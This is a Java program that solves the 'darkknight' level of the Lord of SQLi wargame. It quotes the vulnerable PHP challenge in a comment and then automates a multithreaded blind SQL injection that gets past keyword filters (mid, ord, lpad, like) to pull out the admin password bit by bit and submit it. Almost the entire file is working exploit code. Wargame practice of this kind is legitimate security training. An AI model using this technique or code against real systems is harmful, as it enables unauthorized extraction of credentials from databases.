import java.io.*;
import java.util.*;
import java.net.*;
/**
 * solving los problem example
 * @author imscs21
 * @url https://github.com/imscs21/los
 * 
 */
/*  ====P-R-O-B-L-E-M====
 * 
 *<?php 
 include "./config.php"; 
 login_chk(); 
 dbconnect(); 
 if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
 if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
 if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
 $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
 echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
 $result = @mysql_fetch_array(mysql_query($query)); 
 if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 

 $_GET[pw] = addslashes($_GET[pw]); 
 $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
 $result = @mysql_fetch_array(mysql_query($query)); 
 if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
 highlight_file(__FILE__); 
 ?>
 * 
 */


public class Darknight
implements Runnable
{
	HttpURLConnection conn=null;
	public static String getContent(InputStream ism) throws IOException{
		StringBuffer sb = new StringBuffer();
		//BufferedReader br = new BufferedReader(new BufferedInputStream(ism));
		DataInputStream dis = new DataInputStream(ism);
		String l;
		while((l=dis.readLine())!=null){
			sb.append(l);
		}
		dis.close();

		final String result = sb.toString();
		sb=null;
		return result;
	}
	public static String queryContent(Configure conf,String sub_query)throws Exception{
		return queryContent(conf,conf.getCookieContent(),sub_query);
	}
	public static String queryContent(Configure conf,String cookie_content,String sub_query) throws Exception{
		HttpURLConnection conn =(HttpURLConnection) new URL(conf.getURL()+sub_query).openConnection();
		//conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930S Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36");
		conn.addRequestProperty("Cookie",cookie_content);
		conn.connect();
		InputStream ism = conn.getInputStream();
		final String content = getContent(ism);
		ism.close();
		conn.disconnect();
		conn=null;
		return content;
	}
	public static boolean solveNow(Configure conf,String fullanswer,boolean pwVarOnly) throws Exception{
		Scanner sc = new Scanner(System.in);
		System.out.print("would you want to clear this level on this program?[y/n] ");
String content;
		final String resp = sc.next();
		final String fnt = pwVarOnly?"pw=%s":"%s";
		if(resp.equals("y")||resp.equals("Y")){

			System.out.println("applying...");
			String sub_query = "?"+String.format(fnt,URLEncoder.encode( fullanswer));
			content=queryContent(conf,sub_query);

			if(isSuccessAndIsClear(content)||isClear(resp)){
				System.out.println("Stage Clear!");
				return true;
			}else{
				sub_query = "?"+String.format(fnt, fullanswer);
				content=queryContent(conf,sub_query);

				if(isSuccessAndIsClear(content)||isClear(content)){
					System.out.println("Stage Clear!");
					return true;
				}else{//tested on only mac (java ver 1.8.91) and windows NT isn`t seemed to be compatible on encoding(windows java ver 1.8.111 - x86) with string variable
					System.out.println("failed...(please apply on another java environment , and Integer Numbers in found:: logs are accurate data.)");
				
					}
					return false;
			}
		}
		return false;
	}
	
	public static boolean isSuccess(String resp,String[] acclst){
		boolean rst = false;
		for(String acc:acclst){
			rst = rst||resp.contains("<h2>Hello "+acc);
			if(rst){
				break;
			}
		}
		return rst;
	}

	public static boolean isSuccess(String resp){
		return isSuccess(resp,new String[]{"guest","Guest","Admin","admin"});
	}
	public static boolean isSuccessAndIsClear(String resp){
		return isSuccess(resp)&&isClear(resp);
	}
	public static boolean  isClear(String resp){
		return resp.contains(" Clear!");
	}
	protected void saveListOnFile(File f,int pos,ArrayList<String> lst) throws Exception{
		OutputStream osm = new FileOutputStream(f);
		ObjectOutputStream dos = new ObjectOutputStream(osm);
		dos.writeInt(pos);
		dos.flush();
		dos.writeObject(lst);
		dos.flush();
		dos.close();
		osm.close();
	}
	public void run(){
		final Configure conf = new Configure();
		if(conf.getToken().equals("exit")){
			return;
		}

		try{
			final int bin_len = 16;
			final String fntans = String.format( "0 ||  (id like 'admin' && strcmp(substr(pw,%%d,1),' ')<>0 && substr(lpad(bin(ascii(substr(pw,%%d,1))),%d,'0'),%%d,1) like '1')  #".replaceAll("substr","mid").replaceAll("ascii","ord").replaceAll("'","\""),bin_len);
			
			String rst = "";
			boolean isfirst=true;
			char c = 0;
			int l =1;
			while(isfirst||c!=0){
				if(isfirst){
					isfirst=false;
				}
			//for(int i=1;i<=strlen;i++){
				final boolean[] bins=new boolean[bin_len];
				Thread[] ths = new Thread[bin_len];
				String bin = "";
				final int i = l;
				for(int k =1;k<=bin_len;k++){
					final int j = k;
					
					ths[k-1]=new Thread(new Runnable(){
						@Override
						public void run(){
							try{
					String sub_query = "?pw=".replaceAll("pw","no")+URLEncoder.encode( String.format(fntans,i,i,j));
					String content=queryContent(conf,sub_query);
					bins[j-1]=isSuccess(content);
					}catch(Exception e){System.out.println(System.out);}
					
					}});
					ths[k-1].start();
				}
				for(int j=0;j<ths.length;j++){
					ths[j].join();
				}
				for(boolean b:bins){
					bin+=b?"1":"0";
				}
				if(bin.length()>0){
				c=(char)Long.parseLong(bin,2);
				}
				if(c>0){
				rst+=Character.toString(c);
				}
				l++;
			}
			System.out.println(String.format( "Password is '%s'",rst));
			System.out.println(String.format( "Password is '%s'",URLEncoder.encode( rst)));
			
			solveNow(conf,rst,true);

		}catch(Exception e){
			e.printStackTrace(System.out);
		}
	}
	
	public static void main(String... args){
		
			//int idx = 2;
			//Runnable bi=null;
			for(int idx=0;idx<Thread.currentThread().getStackTrace().length;idx++){
			try{
				Object obj =Class.forName(Thread.currentThread().getStackTrace()[idx].getClassName()).newInstance(); // new Xavis();//getClass().newInstance();
			if(obj!=null&&obj instanceof Runnable&&!(obj instanceof Thread)){
			System.out.println( Thread.currentThread().getStackTrace()[idx].getClassName());
			Thread th = new Thread((Runnable)obj);
			th.start();
			try{th.join();}catch(Exception e2){}
				
			}
			}catch(Exception e){
				
			}
			}
				
	

		System.out.println("program finish");
	}
	protected static class Configure{
		protected String token="",mUrl="";
		public String setToken(String tk){
			token=tk;
			return tk;
		}
		public String setURL(String url){
			mUrl=url;
			return url;
		}
		public String getURL(){
			return mUrl;
		}
		public String getToken(){
			return token;

		}
		public String getCookieContent(){
			return  "PHPSESSID="+getToken()+";";
		}
		public final static String file_version = "3.1";
		public Configure(){
			Scanner sc = new Scanner(System.in);
			System.out.println("File Version= "+file_version);
			System.out.print("input session tokenqqq: ");
			String ans = sc.next();
			setToken(ans);
			System.out.print("input url: ");
			setURL(sc.next());
			System.out.println();

		}
	}
}
